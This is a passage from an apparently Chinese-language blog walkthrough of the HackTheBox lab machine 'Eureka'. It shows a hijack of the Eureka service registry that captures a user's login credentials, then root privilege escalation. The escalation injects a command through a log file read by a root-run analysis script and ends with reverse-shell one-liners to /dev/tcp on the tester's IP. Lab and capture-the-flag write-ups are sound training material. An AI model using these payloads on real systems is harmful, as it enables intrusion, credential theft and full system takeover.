class=\"hljs-string\">\"ADDED\"</span>\n      }\n    ]\n  }\n}\n\n</code></pre>\n<p>构造恶意数据包，不需要全部都添加，慢慢测试即可</p>\n<pre><code class=\"hljs language-bash\">curl <span class=\"hljs-string\">'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE'</span> -H <span class=\"hljs-string\">'Content-Type: application/json'</span> -d <span class=\"hljs-string\">'{\n  \"instance\": {\n\t  \"hostName\": \"10.10.16.59\",\n    \"instanceId\": \"USER-MANAGEMENT-SERVICE\",\n    \"app\": \"USER-MANAGEMENT-SERVICE\",\n    \"ipAddr\": \"10.10.16.59\",\n    \"vipAddress\": \"USER-MANAGEMENT-SERVICE\",\n    \"secureVipAddress\": \"USER-MANAGEMENT-SERVICE\",\n    \"dataCenterInfo\": {\n      \"@class\": \"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\",\n      \"name\": \"MyOwn\"\n    },\n    \"status\": \"UP\",\n    \"port\": {\n      \"$\": 8081,\n      \"@enabled\": \"true\"\n    }\n  }\n}'</span>\n</code></pre>\n<p>然后我们的端口就会捕获到数据包</p>\n<pre><code class=\"hljs language-bash\">➜  Eureka nc -lvp 8081\nlistening on [any] 8081 ...\nconnect to [10.10.16.59] from eureka.htb [10.10.11.66] 43346\nPOST /login HTTP/1.1\nX-Real-IP: 127.0.0.1\nX-Forwarded-For: 127.0.0.1,127.0.0.1\nX-Forwarded-Proto: http,http\nContent-Length: 168\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nCookie: SESSION=ZjljOWMxOTctMWMyNS00YThkLThlNzItM2RhMDcxYTdkOTk3\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\nForwarded: proto=http;host=furni.htb;<span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"127.0.0.1:45412\"</span>\nX-Forwarded-Port: 80\nX-Forwarded-Host: furni.htb\nhost: 10.10.16.59:8081\n\nusername=miranda.wise%40furni.htb&#x26;password=IL%21veT0Be%26BeT0L0ve&#x26;_csrf=IcxoURYl9qB2QGXTrE_ozcieiecjjQ056cY7bHQ7wAynOgBAFv9bMicVwZBbclLqlGLc9P74pN9HvDUUi6ADDxcO-DTEXjEk\n</code></pre>\n<p>得到 <code>miranda</code> 的账号密码</p>\n<pre><code class=\"hljs language-bash\">username=miranda.wise@furni.htb&#x26;password=IL!veT0Be&#x26;BeT0L0ve\n</code></pre>\n<p><code>SSH</code> 登录</p>\n<pre><code class=\"hljs language-bash\">➜  Eureka ssh miranda-wise@10.10.11.66\nmiranda-wise@10.10.11.66<span class=\"hljs-string\">'s password: \nLast login: Sun Apr 27 12:40:29 2025 from 10.10.16.59\nmiranda-wise@eureka:~$ \n</span></code></pre>\n<p>拿到 user.txt</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> user.txt\n1c0182b3b229fff1f28a469053a94c36\n</code></pre>\n<h2>提权</h2>\n<h3>信息收集</h3>\n<p>使用了 Linpeas.sh 进行收集后，没找到什么有趣的信息</p>\n<pre><code class=\"hljs language-bash\">═══════════════════════════════╣ Basic information ╠═══════════════════════════════\n                               ╚═══════════════════╝\nOS: Linux version 5.4.0-214-generic (buildd@lcy02-amd64-062) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) <span class=\"hljs-comment\">#234-Ubuntu SMP Fri Mar 14 23:50:27 UTC 2025</span>\nUser &#x26; Groups: uid=1001(miranda-wise) gid=1002(miranda-wise) <span class=\"hljs-built_in\">groups</span>=1002(miranda-wise),1003(developers)\nHostname: eureka\n</code></pre>\n<h3>脚本分析</h3>\n<p>又回到之前的脚本处，想起来使用 <code>pspy64</code> 进行检测的时候还有另外一个脚本</p>\n<pre><code class=\"hljs language-bash\">2025/04/28 05:00:41 CMD: UID=0     PID=2047217 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log \n</code></pre>\n<p>是以 <code>root</code> 身份运行的，并且我们对 <code>/var/www/web/user-management-service</code> 目录有删除的权限，但是对 <code>application.log</code> 没有写的权限，但是我们可以删除了日志文件后再创建一个，我们就有写权限了，所以我们现在要找到脚本中是否存在命令注入</p>\n<pre><code class=\"hljs language-bash\">╔══════════╣ Interesting GROUP writable files (not <span class=\"hljs-keyword\">in</span> Home) (max 200)\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files\n  Group developers:\n/var/www/web    \n/var/www/web/user-management-service\n/var/www/web/user-management-service/target \n</code></pre>\n<p>分析脚本（喂给 <code>GPT</code>）</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/bin/bash</span>\n\n<span class=\"hljs-comment\"># 颜色定义，用于输出彩色信息</span>\nGREEN=<span class=\"hljs-string\">'\\033[0;32m'</span>      <span class=\"hljs-comment\"># 绿色，用于成功消息</span>\nRED=<span class=\"hljs-string\">'\\033[0;31m'</span>        <span class=\"hljs-comment\"># 红色，用于错误消息</span>\nYELLOW=<span class=\"hljs-string\">'\\033[1;33m'</span>     <span class=\"hljs-comment\"># 黄色，用于警告消息</span>\nBLUE=<span class=\"hljs-string\">'\\033[0;34m'</span>       <span class=\"hljs-comment\"># 蓝色，用于信息消息</span>\nCYAN=<span class=\"hljs-string\">'\\033[0;36m'</span>       <span class=\"hljs-comment\"># 青色，用于一般信息</span>\nRESET=<span class=\"hljs-string\">'\\033[0m'</span>         <span class=\"hljs-comment\"># 重置颜色，恢复默认颜色</span>\n\n<span class=\"hljs-comment\"># 定义日志文件和输出文件</span>\nLOG_FILE=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>\"</span>           <span class=\"hljs-comment\"># 第一个参数为日志文件的路径</span>\nOUTPUT_FILE=<span class=\"hljs-string\">\"log_analysis.txt\"</span>  <span class=\"hljs-comment\"># 输出文件，保存分析结果</span>\n\n<span class=\"hljs-comment\"># 声明关联数组，用于存储登录计数</span>\n<span class=\"hljs-built_in\">declare</span> -A successful_users  <span class=\"hljs-comment\"># 关联数组，存储成功登录的用户及其次数：用户名 -> 次数</span>\n<span class=\"hljs-built_in\">declare</span> -A failed_users      <span class=\"hljs-comment\"># 关联数组，存储失败登录的用户及其次数：用户名 -> 次数</span>\n\n<span class=\"hljs-comment\"># 定义初始的 HTTP 状态码及其计数（初始化为 0）</span>\nSTATUS_CODES=(<span class=\"hljs-string\">\"200:0\"</span> <span class=\"hljs-string\">\"201:0\"</span> <span class=\"hljs-string\">\"302:0\"</span> <span class=\"hljs-string\">\"400:0\"</span> <span class=\"hljs-string\">\"401:0\"</span> <span class=\"hljs-string\">\"403:0\"</span> <span class=\"hljs-string\">\"404:0\"</span> <span class=\"hljs-string\">\"500:0\"</span>)\n\n<span class=\"hljs-comment\"># 检查日志文件是否存在</span>\n<span class=\"hljs-keyword\">if</span> [ ! -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$LOG_FILE</span>\"</span> ]; <span class=\"hljs-keyword\">then</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${RED}</span>Error: Log file <span class=\"hljs-variable\">$LOG_FILE</span> not found.<span class=\"hljs-variable\">${RESET}</span>\"</span>  <span class=\"hljs-comment\"># 如果文件不存在，输出错误信息</span>\n    <span class=\"hljs-built_in\">exit</span> 1  <span class=\"hljs-comment\"># 脚本退出并返回错误码</span>\n<span class=\"hljs-keyword\">fi</span>\n\n<span class=\"hljs-comment\"># 分析登录成功和失败的函数</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">analyze_logins</span></span>() {\n    <span class=\"hljs-comment\"># 处理成功登录的记录</span>\n    <span class=\"hljs-keyword\">while</span> IFS= <span class=\"hljs-built_in\">read</span> -r line; <span class=\"hljs-keyword\">do</span>\n        username=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$line</span>\"</span> | awk -F<span class=\"hljs-string\">\"'\"</span> <span class=\"hljs-string\">'{print $2}'</span>)  <span class=\"hljs-comment\"># 从日志行中提取用户名</span>\n        <span class=\"hljs-comment\"># 如果用户已经存在于数组中，则增加该用户的登录计数</span>\n        <span class=\"hljs-keyword\">if</span> [ -n <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${successful_users[$username]+_}</span>\"</span> ]; <span class=\"hljs-keyword\">then</span>\n            successful_users[<span class=\"hljs-variable\">$username</span>]=$((successful_users[<span class=\"hljs-variable\">$username</span>] + <span class=\"hljs-number\">1</span>))\n        <span class=\"hljs-keyword\">else</span>\n            successful_users[<span class=\"hljs-variable\">$username</span>]=1  <span class=\"hljs-comment\"># 第一次登录，初始化计数为 1</span>\n        <span class=\"hljs-keyword\">fi</span>\n    <span class=\"hljs-keyword\">done</span> &#x3C; &#x3C;(grep <span class=\"hljs-string\">\"LoginSuccessLogger\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$LOG_FILE</span>\"</span>)  <span class=\"hljs-comment\"># 过滤出包含 'LoginSuccessLogger' 的行</span>\n\n    <span class=\"hljs-comment\"># 处理失败登录的记录</span>\n    <span class=\"hljs-keyword\">while</span> IFS= <span class=\"hljs-built_in\">read</span> -r line; <span class=\"hljs-keyword\">do</span>\n        username=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$line</span>\"</span> | awk -F<span class=\"hljs-string\">\"'\"</span> <span class=\"hljs-string\">'{print $2}'</span>)  <span class=\"hljs-comment\"># 从日志行中提取用户名</span>\n        <span class=\"hljs-comment\"># 如果用户已经存在于数组中，则增加该用户的失败登录计数</span>\n        <span class=\"hljs-keyword\">if</span> [ -n <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${failed_users[$username]+_}</span>\"</span> ]; <span class=\"hljs-keyword\">then</span>\n            failed_users[<span class=\"hljs-variable\">$username</span>]=$((failed_users[<span class=\"hljs-variable\">$username</span>] + <span class=\"hljs-number\">1</span>))\n        <span class=\"hljs-keyword\">else</span>\n            failed_users[<span class=\"hljs-variable\">$username</span>]=1  <span class=\"hljs-comment\"># 第一次失败，初始化计数为 1</span>\n        <span class=\"hljs-keyword\">fi</span>\n    <span class=\"hljs-keyword\">done</span> &#x3C; &#x3C;(grep <span class=\"hljs-string\">\"LoginFailureLogger\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$LOG_FILE</span>\"</span>)  <span class=\"hljs-comment\"># 过滤出包含 'LoginFailureLogger' 的行</span>\n}\n\n<span class=\"hljs-comment\"># 分析日志中的 HTTP 状态码</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">analyze_http_statuses</span></span>() {\n    <span class=\"hljs-comment\"># 处理每一行日志，查找状态码</span>\n    <span class=\"hljs-keyword\">while</span> IFS= <span class=\"hljs-built_in\">read</span> -r line; <span class=\"hljs-keyword\">do</span>\n        code=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$line</span>\"</span> | grep -oP <span class=\"hljs-string\">'Status: \\K.*'</span>)  <span class=\"hljs-comment\"># 提取状态码</span>\n        found=0\n        <span class=\"hljs-comment\"># 遍历 STATUS_CODES 数组，检查状态码是否存在</span>\n        <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${!STATUS_CODES[@]}</span>\"</span>; <span class=\"hljs-keyword\">do</span>\n            existing_entry=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${STATUS_CODES[$i]}</span>\"</span>\n            existing_code=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$existing_entry</span>\"</span> | <span class=\"hljs-built_in\">cut</span> -d<span class=\"hljs-string\">':'</span> -f1)  <span class=\"hljs-comment\"># 获取状态码</span>\n            existing_count=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$existing_entry</span>\"</span> | <span class=\"hljs-built_in\">cut</span> -d<span class=\"hljs-string\">':'</span> -f2)  <span class=\"hljs-comment\"># 获取当前计数</span>\n            <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$existing_code</span>\"</span> -eq <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$code</span>\"</span> ]]; <span class=\"hljs-keyword\">then</span>\n                new_count=$((existing_count + <span class=\"hljs-number\">1</span>))  <span class=\"hljs-comment\"># 如果状态码存在，增加计数</span>\n                STATUS_CODES[<span class=\"hljs-variable\">$i</span>]=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${existing_code}</span>:<span class=\"hljs-variable\">${new_count}</span>\"</span>\n                <span class=\"hljs-built_in\">break</span>\n            <span class=\"hljs-keyword\">fi</span>\n        <span class=\"hljs-keyword\">done</span>\n    <span class=\"hljs-keyword\">done</span> &#x3C; &#x3C;(grep <span class=\"hljs-string\">\"HTTP.*Status: \"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$LOG_FILE</span>\"</span>)  <span class=\"hljs-comment\"># 过滤出包含 'Status: ' 的行</span>\n}\n\n<span class=\"hljs-comment\"># 分析日志中的错误信息</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">analyze_log_errors</span></span>(){\n    <span class=\"hljs-comment\"># 输出日志级别的统计信息</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n<span class=\"hljs-variable\">${YELLOW}</span>[+] Log Level Counts:<span class=\"hljs-variable\">${RESET}</span>\"</span>\n    log_levels=$(grep -oP <span class=\"hljs-string\">'(?&#x3C;=Z  )\\w+'</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$LOG_FILE</span>\"</span> | <span class=\"hljs-built_in\">sort</span> | <span class=\"hljs-built_in\">uniq</span> -c)  <span class=\"hljs-comment\"># 提取日志级别并排序统计</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$log_levels</span>\"</span> | awk -v blue=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$BLUE</span>\"</span> -v yellow=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$YELLOW</span>\"</span> -v red=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$RED</span>\"</span> -v reset=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$RESET</span>\"</span> <span class=\"hljs-string\">'{\n        if ($2 == \"INFO\") color=blue;       # INFO级别使用蓝色\n        else if ($2 == \"WARN\") color=yellow; # WARN级别使用黄色\n        else if ($2 == \"ERROR\") color=red;  # ERROR级别使用红色\n        else color=reset;                   # 其他日志级别恢复默认颜色\n        printf \"%s%6s %s%s\\n\", color, $1, $2, reset\n    }'</span>\n\n    <span class=\"hljs-comment\"># 输出所有的错误消息</span>\n    error_messages=$(grep <span class=\"hljs-string\">' ERROR '</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$LOG_FILE</span>\"</span> | awk -F<span class=\"hljs-string\">' ERROR '</span> <span class=\"hljs-string\">'{print $2}'</span>)\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n<span class=\"hljs-variable\">${RED}</span>[+] ERROR Messages:<span class=\"hljs-variable\">${RESET}</span>\"</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$error_messages</span>\"</span> | awk -v red=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$RED</span>\"</span> -v reset=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$RESET</span>\"</span> <span class=\"hljs-string\">'{print red $0 reset}'</span>\n\n    <span class=\"hljs-comment\"># Eureka 服务连接失败的错误</span>\n    eureka_errors=$(grep <span class=\"hljs-string\">'Connect to http://localhost:8761.*failed: Connection refused'</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$LOG_FILE</span>\"</span>)\n    eureka_count=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$eureka_errors</span>\"</span> | <span class=\"hljs-built_in\">wc</span> -l)  <span class=\"hljs-comment\"># 统计 Eureka 错误的数量</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n<span class=\"hljs-variable\">${YELLOW}</span>[+] Eureka Connection Failures:<span class=\"hljs-variable\">${RESET}</span>\"</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${YELLOW}</span>Count: $eureka_count<span class=\"hljs-variable\">${RESET}</span>\"</span>  <span class=\"hljs-comment\"># 输出 Eureka 错误的数量</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$eureka_errors</span>\"</span> | <span class=\"hljs-built_in\">tail</span> -n 2 | awk -v yellow=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$YELLOW</span>\"</span> -v reset=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$RESET</span>\"</span> <span class=\"hljs-string\">'{print yellow $0 reset}'</span>  <span class=\"hljs-comment\"># 输出最新的 Eureka 错误</span>\n}\n\n<span class=\"hljs-comment\"># 显示最终的分析结果</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">display_results</span></span>() {\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BLUE}</span>----- Log Analysis Report -----<span class=\"hljs-variable\">${RESET}</span>\"</span>\n\n    <span class=\"hljs-comment\"># 输出成功登录统计信息</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n<span class=\"hljs-variable\">${GREEN}</span>[+] Successful Login Counts:<span class=\"hljs-variable\">${RESET}</span>\"</span>\n    total_success=0\n    <span class=\"hljs-keyword\">for</span> user <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${!successful_users[@]}</span>\"</span>; <span class=\"hljs-keyword\">do</span>\n        count=<span class=\"hljs-variable\">${successful_users[$user]}</span>\n        <span class=\"hljs-built_in\">printf</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${GREEN}</span>%6s %s<span class=\"hljs-variable\">${RESET}</span>\\n\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$count</span>\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$user</span>\"</span>  <span class=\"hljs-comment\"># 显示每个用户的成功登录次数</span>\n        total_success=$((total_success + count))  <span class=\"hljs-comment\"># 累加成功登录总数</span>\n    <span class=\"hljs-keyword\">done</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${GREEN}</span>\\nTotal Successful Logins: $total_success<span class=\"hljs-variable\">${RESET}</span>\"</span>  <span class=\"hljs-comment\"># 显示成功登录总数</span>\n\n    <span class=\"hljs-comment\"># 输出失败登录统计信息</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n<span class=\"hljs-variable\">${RED}</span>[+] Failed Login Attempts:<span class=\"hljs-variable\">${RESET}</span>\"</span>\n    total_failed=0\n    <span class=\"hljs-keyword\">for</span> user <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${!failed_users[@]}</span>\"</span>; <span class=\"hljs-keyword\">do</span>\n        count=<span class=\"hljs-variable\">${failed_users[$user]}</span>\n        <span class=\"hljs-built_in\">printf</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${RED}</span>%6s %s<span class=\"hljs-variable\">${RESET}</span>\\n\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$count</span>\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$user</span>\"</span>  <span class=\"hljs-comment\"># 显示每个用户的失败登录次数</span>\n        total_failed=$((total_failed + count))  <span class=\"hljs-comment\"># 累加失败登录总数</span>\n    <span class=\"hljs-keyword\">done</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${RED}</span>\\nTotal Failed Login Attempts: $total_failed<span class=\"hljs-variable\">${RESET}</span>\"</span>  <span class=\"hljs-comment\"># 显示失败登录总数</span>\n\n    <span class=\"hljs-comment\"># 输出 HTTP 状态码分布</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n<span class=\"hljs-variable\">${CYAN}</span>[+] HTTP Status Code Distribution:<span class=\"hljs-variable\">${RESET}</span>\"</span>\n    total_requests=0\n    <span class=\"hljs-comment\"># 按状态码进行排序</span>\n    IFS=$<span class=\"hljs-string\">'\\n'</span> sorted=($(<span class=\"hljs-built_in\">sort</span> -n -t<span class=\"hljs-string\">':'</span> -k1 &#x3C;&#x3C;&#x3C;<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${STATUS_CODES[*]}</span>\"</span>))\n    <span class=\"hljs-built_in\">unset</span> IFS\n    <span class=\"hljs-keyword\">for</span> entry <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${sorted[@]}</span>\"</span>; <span class=\"hljs-keyword\">do</span>\n        code=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$entry</span>\"</span> | <span class=\"hljs-built_in\">cut</span> -d<span class=\"hljs-string\">':'</span> -f1)  <span class=\"hljs-comment\"># 获取状态码</span>\n        count=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$entry</span>\"</span> | <span class=\"hljs-built_in\">cut</span> -d<span class=\"hljs-string\">':'</span> -f2)  <span class=\"hljs-comment\"># 获取该状态码的计数</span>\n        total_requests=$((total_requests + count))  <span class=\"hljs-comment\"># 累加 HTTP 请求总数</span>\n        \n        <span class=\"hljs-comment\"># 根据状态码的类型选择颜色</span>\n        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$code</span> =~ ^2 ]]; <span class=\"hljs-keyword\">then</span> color=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$GREEN</span>\"</span>   <span class=\"hljs-comment\"># 2xx 状态码使用绿色</span>\n        <span class=\"hljs-keyword\">elif</span> [[ <span class=\"hljs-variable\">$code</span> =~ ^3 ]]; <span class=\"hljs-keyword\">then</span> color=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$YELLOW</span>\"</span> <span class=\"hljs-comment\"># 3xx 状态码使用黄色</span>\n        <span class=\"hljs-keyword\">elif</span> [[ <span class=\"hljs-variable\">$code</span> =~ ^4 || <span class=\"hljs-variable\">$code</span> =~ ^5 ]]; <span class=\"hljs-keyword\">then</span> color=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$RED</span>\"</span>  <span class=\"hljs-comment\"># 4xx 和 5xx 状态码使用红色</span>\n        <span class=\"hljs-keyword\">else</span> color=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$CYAN</span>\"</span>  <span class=\"hljs-comment\"># 其他状态码使用青色</span>\n        <span class=\"hljs-keyword\">fi</span>\n        \n        <span class=\"hljs-built_in\">printf</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${color}</span>%6s %s<span class=\"hljs-variable\">${RESET}</span>\\n\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$count</span>\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$code</span>\"</span>  <span class=\"hljs-comment\"># 显示每个状态码及其计数</span>\n    <span class=\"hljs-keyword\">done</span>\n    <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${CYAN}</span>\\nTotal HTTP Requests Tracked: $total_requests<span class=\"hljs-variable\">${RESET}</span>\"</span>  <span class=\"hljs-comment\"># 显示 HTTP 请求总数</span>\n}\n\n<span class=\"hljs-comment\"># 主执行过程</span>\nanalyze_logins  <span class=\"hljs-comment\"># 调用分析登录函数</span>\nanalyze_http_statuses  <span class=\"hljs-comment\"># 调用分析 HTTP 状态码函数</span>\ndisplay_results | <span class=\"hljs-built_in\">tee</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$OUTPUT_FILE</span>\"</span>  <span class=\"hljs-comment\"># 显示结果并保存到输出文件</span>\nanalyze_log_errors | <span class=\"hljs-built_in\">tee</span> -a <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$OUTPUT_FILE</span>\"</span>  <span class=\"hljs-comment\"># 分析日志错误并追加到输出文件</span>\n<span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n<span class=\"hljs-variable\">${GREEN}</span>Analysis completed. Results saved to $OUTPUT_FILE<span class=\"hljs-variable\">${RESET}</span>\"</span>  <span class=\"hljs-comment\"># 输出分析完成消息</span>\n</code></pre>\n<p>然后发现一些可能存在命令注入的地方</p>\n<pre><code class=\"hljs language-bash\">username=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$line</span>\"</span> | awk -F<span class=\"hljs-string\">\"'\"</span> <span class=\"hljs-string\">'{print $2}'</span>)  <span class=\"hljs-comment\"># 从日志行中提取用户名</span>\ncode=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$line</span>\"</span> | grep -oP <span class=\"hljs-string\">'Status: \\K.*'</span>)\n</code></pre>\n<p>对这里进行测试</p>\n<pre><code class=\"hljs language-bash\">➜  Eureka <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(echo 1 >> 1.txt)</span>\"</span> | grep -oP <span class=\"hljs-string\">'Status: \\K.*'</span>\n\n➜  Eureka <span class=\"hljs-built_in\">cat</span> 1.txt\n\n1\n</code></pre>\n<h3>命令注入</h3>\n<p>在靶机上测试</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">rm</span> -r /var/www/web/user-management-service/log/application.log\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Status: <span class=\"hljs-subst\">$(echo 1 >> /home/miranda-wise/1.txt)</span>\"</span> > /var/www/web/user-management-service/log/application.log\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image6.png\" alt=\"image.png\"></p>\n<p>成功，进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Status: <span class=\"hljs-subst\">$(/bin/bash -c 'bash -i >&#x26; /dev/tcp/10.10.16.59/1234 0>&#x26;1')</span>\"</span> > /var/www/web/user-management-service/log/application.log\n</code></pre>\n<p>但是直接注入会以当前用户执行，所以我们需要对其进行改造</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image7.png\" alt=\"image.png\"></p>\n<p>这样就不会直接执行，而是先写入到日志文件中</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'HTTP Status: x[$(/bin/bash -i >&#x26; /dev/tcp/10.10.16.59/1234 0>&#x26;1)]'</span> > /var/www/web/user-management-service/log/application.log\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image8.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> root.txt\n2a29dd1a4d1172b24ca76dd452035829\n</code></pre>\n<h2>总结</h2>\n<p>信息收集是真的很重要，对收集到信息去仔细分析，总是会找到有用的。</p>","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","updated":"2025-09-20","comments":true,"tags":["Linux靶机","HackTheBox","Spring","Eureka","命令注入"],"categories":"靶机","description":"Machine Eureka https://app.hackthebox.com/machines/Eureka | Hard PS：尤里卡发动！所有奇观建造提速 30% ! 前期踩点 Web 渗透 信息收集 WhatWeb 页面上的一些操作要进行登陆后才能进行操作 抓个包分析一下框架 nginx..."},"recentPosts":[{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"}]},"__N_SSG":true}